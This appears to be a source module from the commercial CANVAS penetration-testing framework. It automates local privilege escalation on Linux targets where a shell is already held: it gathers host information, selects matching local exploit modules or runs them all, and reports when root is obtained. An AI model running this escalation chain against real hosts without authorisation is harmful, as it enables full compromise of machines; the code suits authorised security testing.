#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os
import getopt
import socket
import canvasengine
import time
import logging
import info_gathering
import checks
import yaml

from inspect import getmembers, isfunction
from canvas_modules import *
from exploitutils import *
from canvasModuleIterator import canvasModuleIterator
from ExploitTypes.localcommand import LocalCommand
from canvasengine import getExploitPackName

NAME                            = "GetRoot - Linux generic automatic LPE"
DESCRIPTION                     = "Scans for and exploits generic OS and/or configuration related vulnerabilities automatically in linux hosts"
DOCUMENTATION                   = {}
DOCUMENTATION["NOTES"]          = """

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Linux", "x64"], ["Linux", "x86"]]
PROPERTY['VERSION']             = [ "" ]

CHANGELOG = """

"""

class theexploit(canvasModuleIterator):
    def __init__(self):
        #Initialize the class and its super.
        LocalCommand.__init__(self)
        self.result = ""
        self.name = NAME
        self.runall = False
        self.linux_list = list()
        return

    def get_args(self):
        self.getarg("runall")

    def get_module_functions(self, module):
        #Returns a dictionary, dict[function_name] = function.
        #For an specified module.
        out = [o for o in getmembers(module) if isfunction(o[1]) and o[1].__module__ == module.__name__]
        out = dict(out)
        return out

    def get_node_info(self, node):
        #Reflectively run every info_gathering function, each one has to return a dict.
        logging.info("Gathering information from target...")
        gathering_funcs = self.get_module_functions(info_gathering)
        node_info = dict()
        for name, func in gathering_funcs.iteritems():
            node_info.update(func(node))
        return node_info

    def check_kernelver(self, node_info, module):
        #Returns False if the module has the KERNELVER property and it's not vulnerable.
        #Returns None if the module does not have the KERNELVER property.
        #Otherwise it returns true.
        if "KERNELVER" in module.PROPERTY:
            for kver in module.PROPERTY["KERNELVER"]:
                if kver in node_info["release"]:
                    return True
            return False
        return None

    def run_checks(self, node_info, checks_list):
        #Runs every check on the list for a node, using the info acquired.
        #Functions are called reflectively with the parameters set on the CANVAS_MODULE dictionary.
        if not checks_list:
            return True
        checks_funcs = self.get_module_functions(checks)
        for check in checks_list:
            if check['Check'] not in checks_funcs:
                logging.error("The checking function %s has not been programmed yet", check['Check'])
                raise RuntimeError
                return False
            params = [node_info]
            if check['Params']:
                params = params + check['Params']
            if not checks_funcs[check['Check']](*params):
                return False
        return True

    def run(self):
        self.get_args()
        self.setInfo("%s (in progress)" % (NAME))
        node = self.argsDict["passednodes"][0]
        self.result = []
        linux_list = get_linux_modules(self.runall)
        for node in self.argsDict["passednodes"]:
            exploit_list = []
            exploit_params = dict()
            if node.shell is None:
                logging.warning("No shell present in target node, skipping")
                self.result += [0]
                continue

            if node.nodetype != "linuxNode":
                logging.warning("Node is not a valid linux node, skipping")
                self.result += [0]
                continue

            if self.runall:
                logging.info("Running all available linux exploits")
                linux_list_modules = linux_list.values()
                self.run_exploits(node, linux_list_modules)

            else:
                node_info = self.get_node_info(node)
                for m_name, m_module in linux_list.iteritems():
                    #Module has been blacklisted.
                    params = None
                    if m_name in MODULES_BLACKLIST:
                        continue
                    #We check if the module has the KERNELVER property.
                    retval = self.check_kernelver(node_info, m_module)
                    #If it has the property, but it's not vulnerable, we skip.
                    if retval == False:
                        self.cry_not_vulnerable(m_name, str(node))
                        continue
                    #No KERNELVER property, we run every other check.
                    if retval is None:
                        #We check if the module has the is_vulnerable() method.
                        #Otherwise we check if it's on the CANVAS_MODULES list.
                        if "is_vulnerable" not in dir(m_module.theexploit):
                            #If the module is on CANVAS_MODULES, then we run its checks.
                            #Otherwise, we skip it.
                            if m_name not in CANVAS_MODULES:
                                logging.info("We have no way of knowing if the target is vulnerable to module %s", m_name)
                                continue
                            #We run checks defined in CANVAS_MODULES
                            if not self.run_checks(node_info, CANVAS_MODULES[m_name]["Checks"]):
                                self.cry_not_vulnerable(m_name, str(node))
                                continue
                            params = CANVAS_MODULES[m_name]["Params"]
                    #If everything checks out, we add it to the list.
                    exploit_list.append(m_module)
                    exploit_params[m_name] = params

                if len(exploit_list) == 0:
                    logging.warning("No suitable exploits found, skipping")
                    self.result += [0]
                    continue
                self.run_exploits(node, exploit_list, exploit_params)
            curr_uid = node.shell.getuid()

            if curr_uid == 0:
                self.result += [1]
                logging.info("Got r00t!")
            else:
                self.result += [0]
                logging.info("It was not possible to escalate to root. Current uid is %i",curr_uid)

        if 1 in self.result:
            ret = 1
        else:
            ret = 0
        self.dispshellcmd = self.command
        self.setInfo("%s - done" % (NAME))

        return ret

def get_linux_modules(exploitsOnly = False):
    #Returns a dictionary, dict[module_name] = module_instance.
    #If exploits want to be excluded, then exploitsOnly can be set.
    candidates = canvasengine.exploitmodsGet(True)
    output_list = dict()
    for candidate in candidates:
        candidate = candidates[candidate].mod
        for arch in candidate.PROPERTY['ARCH']:
            if 'Linux' in arch or 'Unix' in arch:
                if candidate.PROPERTY['SITE'].lower() == 'local':
                    if not exploitsOnly or candidate.PROPERTY['TYPE'].lower() == 'exploit':
                        output_list[candidate.__name__] = candidate
    return output_list

def checkModules():
    candidates = get_linux_modules()
    for m_name, m_module in candidates.iteritems():
        exploit_pack = getExploitPackName(m_name)
        if m_name in MODULES_BLACKLIST:
            continue
        if "KERNELVER" in m_module.PROPERTY:
            continue
        if "is_vulnerable" in dir(m_module.theexploit):
            continue
        if m_name in CANVAS_MODULES:
            continue
        # Our partners may produce an exploit able to run with this module
        # but they don't then we just exclude the module from the list.
        if exploit_pack != 'CANVAS':
            continue
        logging.error("""
----------------------------------------------------------------------------------
The module %s has not implemented any way of checking if the target is vulnerable.
Define the property KERNELVER, implement the method is_vulnerable(), define checks
in the CANVAS_MODULES dictionary or add the module to MODULE_BLACKLIST.
----------------------------------------------------------------------------------
""", m_name)
        os._exit(1)


if __name__=="__main__":
    logging.warning("This module is only meant to be run through CANVAS.")
